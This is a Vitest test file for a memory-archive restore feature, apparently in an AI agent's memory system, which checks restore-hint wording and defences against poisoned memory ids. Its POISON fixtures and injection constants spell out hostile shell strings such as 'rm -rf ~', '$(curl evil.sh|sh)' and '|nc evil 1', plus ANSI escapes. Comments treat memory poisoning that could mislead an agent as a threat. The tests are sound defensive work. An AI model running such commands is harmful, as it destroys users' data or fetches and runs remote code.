import { describe, it, expect } from "vitest";
import {
  runColdPass, coldRestoreInstruction, coldRestoreCommand, inertMemoryId,
  renderColdHints, renderColdNextStep, sanitizeForDisplay,
  type ColdStorageHit,
} from "../../src/memory/cold-pass.js";
import { isSafeMemoryId } from "../../src/memory/gate.js";
import type { MemoryQuery } from "../../src/memory/score.js";
import type { MemoryEntry } from "../../src/memory/types.js";

// Round-21: a cold hit's ORIGIN decides which restore instruction is honest.
// `sources` is keyed by the index MAP KEY (see resolveMemoryView →
// mergeIndexById), but the lookup used the row's own `entry.id` and defaulted a
// miss to "local" — so any row whose key and id disagree (no index loader
// validates that) rendered `memory-unarchive <id>`: a local command for a record
// that may live only on another device, which fails or acts on the wrong record.
// Origin resolution is now KEY-consistent and FAILS CLOSED to "unknown".

const arch = (id: string, over: Partial<MemoryEntry> = {}): MemoryEntry => ({
  id, type: "semantic", scope: "project:p", project: "p",
  title: "Vim keybindings", summary: "vim editor setup", path: `memory/semantic/p/${id.split("/").pop()}.md`,
  status: "archived", confidence: 1, importance: 1, createdAt: "2026-01-01", updatedAt: "2026-05-05",
  validFrom: null, validTo: null, sourceSessions: [], sourceCommits: [], sourceFiles: [],
  supersedes: null, entities: ["vim"], trust: "trusted", originDevice: null,
  accessCount: 0, lastAccess: null, archivedAt: "2026-05-01", archivedReason: "unused-low-value",
  ...over,
});

const Q = (over: Partial<MemoryQuery> = {}): MemoryQuery => ({
  project: "p", text: "vim", type: null, now: "2026-06-09", ...over,
});

const hit = (over: Partial<ColdStorageHit> = {}): ColdStorageHit => {
  const base: ColdStorageHit = {
    id: "semantic/p/a", title: "Vim keybindings", score: 5, archivedReason: "unused-low-value",
    source: "local", originDevice: null, trust: "trusted", restoreCommand: null, ...over,
  };
  // Keep the fixture self-consistent with what runColdPass would produce, unless
  // a test deliberately overrides restoreCommand.
  return "restoreCommand" in over ? base : { ...base, restoreCommand: coldRestoreCommand(base) };
};

describe("runColdPass — origin is resolved by the index MAP KEY, never the row's own id", () => {
  it("an OVERLAY-only row whose `id` disagrees with its key is NOT reported as local", () => {
    // `sources` is keyed "semantic/p/keyed"; the row filed there names
    // "semantic/p/other". Pre-fix `sources[entry.id]` missed and defaulted to
    // "local", rendering `memory-unarchive semantic/p/other` for an archive that
    // only exists on a sibling device.
    const row = arch("semantic/p/other");
    const cold = runColdPass({
      entries: { "semantic/p/keyed": row },
      scored: [], query: Q(),
      sources: { "semantic/p/keyed": "overlay" },
    });
    expect(cold).toHaveLength(1);
    expect(cold[0].source).toBe("overlay");
    expect(coldRestoreInstruction(cold[0])).not.toMatch(/memory-unarchive/);
  });

  it("a LOCAL row whose key and id agree still resolves to local (regression lock)", () => {
    const cold = runColdPass({
      entries: { "semantic/p/a": arch("semantic/p/a") },
      scored: [], query: Q(),
      sources: { "semantic/p/a": "local" },
    });
    expect(cold[0].source).toBe("local");
    expect(coldRestoreInstruction(cold[0])).toBe("memory-unarchive 'semantic/p/a' to restore");
  });

  it("an UNRESOLVABLE origin fails CLOSED to 'unknown' instead of defaulting to local", () => {
    // sources has no entry for this key at all (the two maps disagree) — we
    // cannot establish where the archive lives, so we must not claim it is here.
    const cold = runColdPass({
      entries: { "semantic/p/a": arch("semantic/p/a") },
      scored: [], query: Q(), sources: {},
    });
    expect(cold[0].source).toBe("unknown");
    expect(coldRestoreInstruction(cold[0])).not.toMatch(/memory-unarchive/);
  });

  it("a non-'local'/'overlay' junk source value is 'unknown', not passed through", () => {
    const cold = runColdPass({
      entries: { "semantic/p/a": arch("semantic/p/a") },
      scored: [], query: Q(),
      sources: { "semantic/p/a": "somewhere-else" } as unknown as Record<string, "local" | "overlay">,
    });
    expect(cold[0].source).toBe("unknown");
  });
});

describe("coldRestoreInstruction — only an ESTABLISHED local hit gets the local command", () => {
  it("local → memory-unarchive <id>", () => {
    expect(coldRestoreInstruction(hit({ source: "local" }))).toBe("memory-unarchive 'semantic/p/a' to restore");
  });

  it("overlay with a known device → restore it on that device", () => {
    expect(coldRestoreInstruction(hit({ source: "overlay", originDevice: "laptop" })))
      .toBe("archived on device laptop; restore it there");
  });

  it("overlay with no known device → still points elsewhere, never at memory-unarchive", () => {
    const s = coldRestoreInstruction(hit({ source: "overlay", originDevice: null }));
    expect(s).toMatch(/another device/);
    expect(s).not.toMatch(/memory-unarchive/);
  });

  it("unknown origin → the safe generic instruction, never a local memory-unarchive", () => {
    const s = coldRestoreInstruction(hit({ source: "unknown" }));
    expect(s).not.toMatch(/memory-unarchive/);
    expect(s).toMatch(/device that archived it/);
  });
});

describe("renderColdHints — an origin-unknown hit never advertises a local restore", () => {
  it("renders the generic instruction for an unknown-origin hit", () => {
    const lines = renderColdHints([hit({ id: "semantic/p/u", source: "unknown" })]);
    expect(lines.join("\n")).not.toMatch(/memory-unarchive/);
    expect(lines.join("\n")).toMatch(/device that archived it/);
  });

  it("still renders the local command for a genuinely local hit", () => {
    expect(renderColdHints([hit({ source: "local" })]).join("\n"))
      .toMatch(/memory-unarchive 'semantic\/p\/a' to restore/);
  });
});

describe("renderColdNextStep — the bare local command requires an ALL-local set", () => {
  it("all-local → keeps `memory-unarchive <id> to restore`", () => {
    expect(renderColdNextStep([hit({ source: "local" }), hit({ id: "semantic/p/b", source: "local" })]))
      .toMatch(/memory-unarchive '<id>' to restore/);
  });

  it("all-unknown → NO bare local command; the safe generic instead", () => {
    const s = renderColdNextStep([hit({ id: "semantic/p/u", source: "unknown" })]);
    expect(s).not.toMatch(/memory-unarchive '<id>' to restore/);
    expect(s).toMatch(/device that archived it/);
  });

  it("all-overlay, one device → names the device (unchanged)", () => {
    const s = renderColdNextStep([hit({ source: "overlay", originDevice: "laptop" })]);
    expect(s).toMatch(/archived on device laptop; restore it there/);
    expect(s).not.toMatch(/memory-unarchive '<id>' to restore/);
  });

  it("unknown mixed with overlay (nothing established local) → generic, no bare local command", () => {
    const s = renderColdNextStep([
      hit({ id: "semantic/p/u", source: "unknown" }),
      hit({ id: "semantic/p/o", source: "overlay", originDevice: "laptop" }),
    ]);
    expect(s).not.toMatch(/memory-unarchive '<id>' to restore/);
    expect(s).toMatch(/device that archived it/);
  });

  it("mixed local + non-local → defers to the per-hit paths (never a blanket local command)", () => {
    const s = renderColdNextStep([
      hit({ source: "local" }),
      hit({ id: "semantic/p/u", source: "unknown" }),
    ]);
    expect(s).toMatch(/each hit carries its own restore path/);
    expect(s).not.toMatch(/^No ACTIVE memory matched.*\(memory-unarchive '<id>' to restore\)\.$/);
  });
});

// Round-25: naming a device in the AGGREGATE sentence is a claim about EVERY hit
// in the set, so it may only be made when every hit actually supplies that device.
// The distinct-device list was built by DROPPING null origins, so a `{laptop,
// null}` set collapsed to one device and told the user BOTH archives live on
// `laptop` — a fabricated origin for the hit whose device we never knew.
describe("renderColdNextStep — an all-overlay set names a device only when EVERY hit supplies it", () => {
  const ov = (id: string, originDevice: string | null): ColdStorageHit =>
    hit({ id, source: "overlay", originDevice });

  it("every hit carries the SAME device → names it (happy path, unchanged)", () => {
    const s = renderColdNextStep([ov("semantic/p/a", "laptop"), ov("semantic/p/b", "laptop")]);
    expect(s).toMatch(/archived on device laptop; restore it there/);
    expect(s).not.toMatch(/memory-unarchive '<id>' to restore/);
  });

  it("one hit has NO device → generic wording, and laptop is NOT named", () => {
    const s = renderColdNextStep([ov("semantic/p/a", "laptop"), ov("semantic/p/b", null)]);
    expect(s).not.toMatch(/laptop/);
    expect(s).not.toMatch(/archived on device /);
    expect(s).toMatch(/each is archived on another device; restore it there/);
    expect(s).not.toMatch(/memory-unarchive '<id>' to restore/);
  });

  it("an EMPTY-string device is no device either → generic wording", () => {
    const s = renderColdNextStep([ov("semantic/p/a", "laptop"), ov("semantic/p/b", "")]);
    expect(s).not.toMatch(/archived on device /);
    expect(s).toMatch(/each is archived on another device; restore it there/);
  });

  it("NO hit carries a device → generic wording (never `device undefined`)", () => {
    const s = renderColdNextStep([ov("semantic/p/a", null), ov("semantic/p/b", null)]);
    expect(s).not.toMatch(/undefined|null/);
    expect(s).toMatch(/each is archived on another device; restore it there/);
  });

  it("two DIFFERENT devices → generic wording (regression lock)", () => {
    const s = renderColdNextStep([ov("semantic/p/a", "laptop"), ov("semantic/p/b", "desktop")]);
    expect(s).not.toMatch(/archived on device /);
    expect(s).toMatch(/each is archived on another device; restore it there/);
  });
});

// ────────────────────────────────────────────────────────────────────────────
// Round-28 (SECURITY): a cold hit's `id` is UNTRUSTED — it is read verbatim out
// of the LENIENT memory index, and memory content originates from digested
// sessions, so memory POISONING is in this project's threat model (it is why the
// v4 review gate exists). The cold hint renders that id into something that
// LOOKS like a shell command and is meant to be copy-pasted (or acted on by an
// agent), so an id carrying `;`, `$( )`, a backtick or whitespace is a
// command-injection-BY-SUGGESTION vector. Defense in depth: VALIDATE the id
// shape, QUOTE it even when safe, and DEGRADE to a non-runnable form otherwise.
// ────────────────────────────────────────────────────────────────────────────

const POISON: ReadonlyArray<readonly [string, string]> = [
  ["semicolon", "semantic/p/a; rm -rf ~"],
  ["command substitution", "semantic/p/$(curl evil.sh|sh)"],
  ["backtick", "semantic/p/`id`"],
  ["whitespace", "semantic/p/a b"],
  ["pipe", "semantic/p/a|nc evil 1"],
  ["ampersand", "semantic/p/a && rm x"],
  ["newline", "semantic/p/a\nrm -rf ~"],
  ["single quote break-out", "semantic/p/a'; rm -rf ~; echo '"],
  ["redirect", "semantic/p/a > /etc/passwd"],
  ["glob", "semantic/p/*"],
];

const METACHARS = [";", "$(", "`", "|", "&", ">", "<", "*", '"', "\n", "\\"];

describe("isSafeMemoryId — the canonical id shape, strictly", () => {
  it("accepts real canonical ids", () => {
    for (const id of [
      "semantic/p/a", "core/user-workflow", "procedural/_global/keep-npm-plugin-aligned",
      "episodic/code-demo/2026-07-24-archival-arc", "entity/_global/vitest", "qa/p/why-x_1",
    ]) expect([id, isSafeMemoryId(id)]).toEqual([id, true]);
  });

  it("rejects every poisoned id", () => {
    for (const [label, id] of POISON) expect([label, isSafeMemoryId(id)]).toEqual([label, false]);
  });

  it("rejects traversal / empty / non-string / absurdly long ids", () => {
    for (const id of ["", "/", "a//b", "../../etc/passwd", "semantic/../core/x", "a/./b", "/leading", "trailing/"]) {
      expect([id, isSafeMemoryId(id)]).toEqual([id, false]);
    }
    expect(isSafeMemoryId(null)).toBe(false);
    expect(isSafeMemoryId(undefined)).toBe(false);
    expect(isSafeMemoryId(123)).toBe(false);
    expect(isSafeMemoryId("a/" + "x".repeat(400))).toBe(false);
  });
});

describe("inertMemoryId — an unsafe id is shown as INERT text, never as shell", () => {
  it("redacts every metacharacter and cannot be broken out of its quotes", () => {
    for (const [label, id] of POISON) {
      const shown = inertMemoryId(id);
      expect([label, /^'[A-Za-z0-9._\/?-]*'$/.test(shown)]).toEqual([label, true]);
      for (const m of [...METACHARS, "'", " "]) {
        // the wrapping quotes are OURS; strip them before looking for a quote
        const inner = shown.slice(1, -1);
        expect([label, m, inner.includes(m)]).toEqual([label, m, false]);
      }
    }
  });
});

describe("coldRestoreCommand — a runnable command needs an ESTABLISHED local origin AND a safe id", () => {
  it("safe local id → the single-QUOTED command", () => {
    expect(coldRestoreCommand(hit({ source: "local", id: "semantic/p/a" })))
      .toBe("memory-unarchive 'semantic/p/a'");
  });

  it("poisoned local id → null (no command at all)", () => {
    for (const [label, id] of POISON) {
      expect([label, coldRestoreCommand(hit({ source: "local", id, restoreCommand: null }))]).toEqual([label, null]);
    }
  });

  it("safe id but a non-local origin → still null (round-21 rule preserved)", () => {
    expect(coldRestoreCommand(hit({ source: "overlay", originDevice: "laptop", restoreCommand: null }))).toBe(null);
    expect(coldRestoreCommand(hit({ source: "unknown", restoreCommand: null }))).toBe(null);
  });
});

describe("cold render surfaces never emit a runnable command for a poisoned id", () => {
  for (const [label, id] of POISON) {
    it(`per-hit instruction + hint line — ${label}`, () => {
      const poisoned = hit({ id, source: "local", restoreCommand: null });
      const instruction = coldRestoreInstruction(poisoned);
      const rendered = renderColdHints([poisoned]);
      const line = rendered[rendered.length - 1]; // the per-hit line, not the header

      // (a) nothing anywhere names the command…
      expect(instruction).not.toMatch(/memory-unarchive/);
      expect(line).not.toMatch(/memory-unarchive/);
      // (b) …the raw id never appears, so no metacharacter reaches an
      //     executable-looking position — including the START of the hint line,
      //     where a pasted line's first word IS the command…
      expect(instruction).not.toContain(id);
      expect(line).not.toContain(id);
      for (const m of METACHARS) expect([label, m, line.includes(m)]).toEqual([label, m, false]);
      // (c) …and the degraded wording says why.
      expect(instruction).toMatch(/unsafe id — restore manually/);
      expect(line).toMatch(/unsafe id — restore manually/);
    });
  }

  it("runColdPass carries restoreCommand: null for a poisoned id, the quoted command for a safe one", () => {
    const cold = runColdPass({
      entries: { "semantic/p/a; rm -rf ~": arch("semantic/p/a; rm -rf ~"), "semantic/p/ok": arch("semantic/p/ok") },
      scored: [], query: Q(),
      sources: { "semantic/p/a; rm -rf ~": "local", "semantic/p/ok": "local" },
    });
    const bad = cold.find((c) => c.id.includes(";"))!;
    const ok = cold.find((c) => c.id === "semantic/p/ok")!;
    expect(bad.restoreCommand).toBe(null);
    expect(ok.restoreCommand).toBe("memory-unarchive 'semantic/p/ok'");
  });

  it("meta.nextStep: ONE poisoned local id disarms the aggregate command for the whole set", () => {
    const s = renderColdNextStep([
      hit({ id: "semantic/p/ok", source: "local" }),
      hit({ id: "semantic/p/a; rm -rf ~", source: "local", restoreCommand: null }),
    ]);
    expect(s).not.toMatch(/memory-unarchive/);
    expect(s).not.toContain(";");
    expect(s).toMatch(/unsafe to use in a command/);
  });

  it("meta.nextStep: an ALL-poisoned local set is disarmed too", () => {
    const s = renderColdNextStep([hit({ id: "semantic/p/`id`", source: "local", restoreCommand: null })]);
    expect(s).not.toMatch(/memory-unarchive/);
    expect(s).not.toContain("`");
    expect(s).toMatch(/unsafe to use in a command/);
  });

  it("meta.nextStep: a poisoned local id in a MIXED set disarms the local half too", () => {
    const s = renderColdNextStep([
      hit({ id: "semantic/p/a$(rm -rf ~)", source: "local", restoreCommand: null }),
      hit({ id: "semantic/p/o", source: "overlay", originDevice: "laptop" }),
    ]);
    expect(s).not.toMatch(/memory-unarchive/);
    expect(s).not.toContain("$(");
    expect(s).toMatch(/unsafe to use in a command/);
  });

  it("safe ids are unaffected — the quoted command still renders (regression lock)", () => {
    const safe = [hit({ id: "semantic/p/a", source: "local" }), hit({ id: "core/user-workflow", source: "local" })];
    expect(renderColdNextStep(safe)).toMatch(/memory-unarchive '<id>' to restore/);
    expect(renderColdHints(safe).join("\n")).toMatch(/memory-unarchive 'core\/user-workflow' to restore/);
    expect(renderColdHints(safe).join("\n")).toContain("  semantic/p/a  ");
  });
});

// ────────────────────────────────────────────────────────────────────────────
// Round-29 (SECURITY): round-28 hardened the `id` because the hint line STARTS
// with it, and dismissed `title` / `archivedReason` / `originDevice` as
// "mid-line, therefore not command position". That reasoning is WRONG. Those
// three fields come out of the SAME lenient, poisonable memory index, and a
// value carrying a NEWLINE ends the current line and opens a NEW one — and the
// start of a line IS command position, for a line a human pastes or an agent
// reads as its own instruction. The same values also reach a TERMINAL, so an
// ESC can repaint / erase / relocate what the user sees. Every untrusted string
// must therefore be sanitized before it is RENDERED — while the JSON payload
// keeps the originals, because machine consumers want the real data.
// ────────────────────────────────────────────────────────────────────────────

// A newline followed by something command-shaped: the whole point of the fix is
// that this can never become the first word of a rendered line.
const NL_INJECT = "\nmemory-unarchive evil; rm -rf /";
const ANSI_INJECT = "\x1b[31mred";
const LONG = "L".repeat(500);

/** Every line the renderer produced, as the terminal would see them. */
const renderedLines = (lines: string[]): string[] => lines.join("\n").split("\n");

/** The line count `renderColdHints` produces for ONE hit with entirely benign
 *  fields — the CONTROL every poisoned render below must still match. If a
 *  poisoned value could open a line, this count would grow. */
const BENIGN_LINE_COUNT = renderedLines(renderColdHints([hit()])).length;

/** No rendered line may BEGIN with the injected command (the leading whitespace
 *  is OURS; a pasted line's first word is what runs). */
const noInjectedLineStart = (lines: string[]): boolean =>
  renderedLines(lines).every((l) => !l.trimStart().startsWith("memory-unarchive evil"));

describe("sanitizeForDisplay — untrusted strings can never open a new line or drive the terminal", () => {
  it("strips newlines and carriage returns, collapsing to ONE line", () => {
    const out = sanitizeForDisplay(`ok${NL_INJECT}`);
    expect(out).not.toContain("\n");
    expect(out).not.toContain("\r");
    expect(out.split("\n")).toHaveLength(1);
    expect(sanitizeForDisplay("a\r\nb")).toBe("a b");
  });

  it("strips WHOLE ANSI escape sequences, not just the ESC byte", () => {
    const out = sanitizeForDisplay(ANSI_INJECT);
    expect(out).not.toContain("\x1b");
    expect(out).not.toContain("[31m");   // a bare ESC strip would leave this behind
    expect(out).toBe("red");
    // cursor / erase / OSC-window-title forms too
    expect(sanitizeForDisplay("a\x1b[2K\x1b[1;1Hb")).toBe("ab");
    expect(sanitizeForDisplay("a\x1b]0;pwned\x07b")).toBe("ab");
    expect(sanitizeForDisplay("a\x1b(Bb")).toBe("ab");
  });

  it("strips every other C0/C1 control character (tab, BEL, backspace, …)", () => {
    expect(sanitizeForDisplay("a\tb\x07c\x08d\x9bE")).toBe("a b c d E");
  });

  it("caps an over-long value with an ellipsis", () => {
    const out = sanitizeForDisplay(LONG);
    expect(out.length).toBeLessThanOrEqual(120);
    expect(out.endsWith("…")).toBe(true);
  });

  it("leaves a normal value untouched (regression lock)", () => {
    expect(sanitizeForDisplay("Vim keybindings")).toBe("Vim keybindings");
    expect(sanitizeForDisplay("unused-low-value")).toBe("unused-low-value");
    expect(sanitizeForDisplay("laptop")).toBe("laptop");
  });

  it("returns an inert placeholder when nothing legible survives", () => {
    expect(sanitizeForDisplay("")).toBe("(unprintable)");
    expect(sanitizeForDisplay("\x1b[31m\n\t ")).toBe("(unprintable)");
  });
});

describe("renderColdHints — a poisoned TITLE cannot inject a line", () => {
  it("a newline in the title produces NO new line and no injected line start", () => {
    const lines = renderColdHints([hit({ title: `Vim${NL_INJECT}` })]);
    for (const l of lines.slice(1)) expect(l).not.toContain("\n");
    expect(renderedLines(lines)).toHaveLength(BENIGN_LINE_COUNT);   // same as the benign control
    expect(noInjectedLineStart(lines)).toBe(true);
    expect(lines[lines.length - 1]).toContain("Vim");
  });

  it("an ANSI escape in the title is removed, sequence and all", () => {
    const line = renderColdHints([hit({ title: ANSI_INJECT })]).pop()!;
    expect(line).not.toContain("\x1b");
    expect(line).not.toContain("[31m");
    expect(line).toContain("red");
  });

  it("an over-long title is truncated", () => {
    const line = renderColdHints([hit({ title: LONG })]).pop()!;
    expect(line).not.toContain(LONG);
    expect(line).toContain("…");
  });

  it("a normal title renders unchanged (regression lock)", () => {
    expect(renderColdHints([hit({ title: "Vim keybindings" })]).pop()!).toContain("— Vim keybindings");
  });
});

describe("renderColdHints — a poisoned archivedReason cannot inject a line", () => {
  it("a newline in the reason produces NO new line and no injected line start", () => {
    const lines = renderColdHints([hit({ archivedReason: `stale${NL_INJECT}` })]);
    for (const l of lines.slice(1)) expect(l).not.toContain("\n");
    expect(renderedLines(lines)).toHaveLength(BENIGN_LINE_COUNT);
    expect(noInjectedLineStart(lines)).toBe(true);
  });

  it("an ANSI escape in the reason is removed, sequence and all", () => {
    const line = renderColdHints([hit({ archivedReason: ANSI_INJECT })]).pop()!;
    expect(line).not.toContain("\x1b");
    expect(line).not.toContain("[31m");
    expect(line).toContain("(red)");
  });

  it("an over-long reason is truncated", () => {
    const line = renderColdHints([hit({ archivedReason: LONG })]).pop()!;
    expect(line).not.toContain(LONG);
    expect(line).toContain("…");
  });

  it("a normal reason renders unchanged (regression lock)", () => {
    expect(renderColdHints([hit({ archivedReason: "unused-low-value" })]).pop()!)
      .toContain("(unused-low-value)");
  });
});

describe("originDevice is untrusted too — the restore instruction cannot be split", () => {
  const ovHit = (originDevice: string | null): ColdStorageHit =>
    hit({ id: "semantic/p/o", source: "overlay", originDevice, restoreCommand: null });

  it("a newline in originDevice produces NO new line in the per-hit instruction or the hint", () => {
    const poisoned = ovHit(`laptop${NL_INJECT}`);
    expect(coldRestoreInstruction(poisoned)).not.toContain("\n");
    const lines = renderColdHints([poisoned]);
    for (const l of lines.slice(1)) expect(l).not.toContain("\n");
    expect(renderedLines(lines)).toHaveLength(BENIGN_LINE_COUNT);
    expect(noInjectedLineStart(lines)).toBe(true);
  });

  it("a newline in originDevice cannot split the aggregate meta.nextStep either", () => {
    const s = renderColdNextStep([ovHit(`laptop${NL_INJECT}`)]);
    expect(s).not.toContain("\n");
    expect(s.trimStart().startsWith("memory-unarchive evil")).toBe(false);
  });

  it("an ANSI escape in originDevice is removed, sequence and all", () => {
    expect(coldRestoreInstruction(ovHit(ANSI_INJECT))).toBe("archived on device red; restore it there");
    expect(renderColdNextStep([ovHit(ANSI_INJECT)])).toContain("archived on device red");
  });

  it("an over-long originDevice is truncated", () => {
    const s = coldRestoreInstruction(ovHit(LONG));
    expect(s).not.toContain(LONG);
    expect(s).toContain("…");
  });

  it("an all-control originDevice degrades to the honest device-agnostic wording", () => {
    expect(coldRestoreInstruction(ovHit("\x1b[31m\n"))).toBe("archived on another device; restore it there");
    expect(renderColdNextStep([ovHit("\x1b[31m\n")])).toMatch(/each is archived on another device/);
  });

  it("a normal originDevice renders unchanged (regression lock)", () => {
    expect(coldRestoreInstruction(ovHit("laptop"))).toBe("archived on device laptop; restore it there");
    expect(renderColdNextStep([ovHit("laptop")])).toContain("archived on device laptop");
  });
});

describe("the JSON payload keeps the UNsanitized originals — machine consumers are unaffected", () => {
  it("runColdPass reports title / archivedReason / originDevice verbatim", () => {
    const row = arch("semantic/p/a", {
      title: `Vim${NL_INJECT}`,
      archivedReason: `unused-low-value${ANSI_INJECT}`,
      originDevice: `laptop${NL_INJECT}`,
    });
    const cold = runColdPass({
      entries: { "semantic/p/a": row }, scored: [], query: Q(),
      sources: { "semantic/p/a": "local" },
    });
    expect(cold).toHaveLength(1);
    expect(cold[0].title).toBe(`Vim${NL_INJECT}`);
    expect(cold[0].archivedReason).toBe(`unused-low-value${ANSI_INJECT}`);
    expect(cold[0].originDevice).toBe(`laptop${NL_INJECT}`);
    // …while the RENDERED lines built from that same hit stay one line each.
    const lines = renderColdHints(cold);
    expect(renderedLines(lines)).toHaveLength(BENIGN_LINE_COUNT);
    expect(noInjectedLineStart(lines)).toBe(true);
  });
});

// ────────────────────────────────────────────────────────────────────────────
// Round-33: the RENDER path must stay strict even though the WRITE path was
// loosened. `missingRewriteField` now uses `isWritableMemoryId` (control chars +
// path abuse only), so an id whose project slug contains a SPACE — what a
// checkout at `~/code/my project` actually produces, since `projectSlugFromPath`
// does not sanitize — is archivable and restorable. It is still NOT safe to
// interpolate into a copy-pasteable command, because an unquoted space splits an
// argv. This is the behavior that JUSTIFIES the two predicates differing, so it
// is asserted explicitly: if someone "unifies" them onto the write predicate,
// these fail.
// ────────────────────────────────────────────────────────────────────────────
describe("round-33 — a WRITABLE id is not automatically a SHELL-SAFE id", () => {
  const SPACED_ID = "semantic/code-my project/some-slug";

  it("the space-bearing id is writable but NOT shell-safe", async () => {
    const { isWritableMemoryId } = await import("../../src/memory/gate.js");
    expect(isWritableMemoryId(SPACED_ID)).toBe(true);
    expect(isSafeMemoryId(SPACED_ID)).toBe(false);
  });

  it("no runnable restore command is offered for it — it degrades to the inert form", () => {
    const poisoned = hit({ id: SPACED_ID, source: "local", restoreCommand: null });
    expect(coldRestoreCommand({ id: SPACED_ID, source: "local" })).toBe(null);

    const instruction = coldRestoreInstruction(poisoned);
    const rendered = renderColdHints([poisoned]);
    const line = rendered[rendered.length - 1];

    // nothing names the command, and the raw (space-bearing) id never appears
    expect(instruction).not.toMatch(/memory-unarchive/);
    expect(line).not.toMatch(/memory-unarchive/);
    expect(line).not.toContain(SPACED_ID);
    // …it is shown INERT instead: quoted, with the space redacted
    expect(inertMemoryId(SPACED_ID)).toBe("'semantic/code-my?project/some-slug'");
  });

  it("one space-bearing local id disarms the aggregate next-step sentence", () => {
    const s = renderColdNextStep([hit({ id: SPACED_ID, source: "local", restoreCommand: null })]);
    expect(s).not.toMatch(/memory-unarchive/);
    expect(s).toMatch(/unsafe to use in a command/);
  });
});
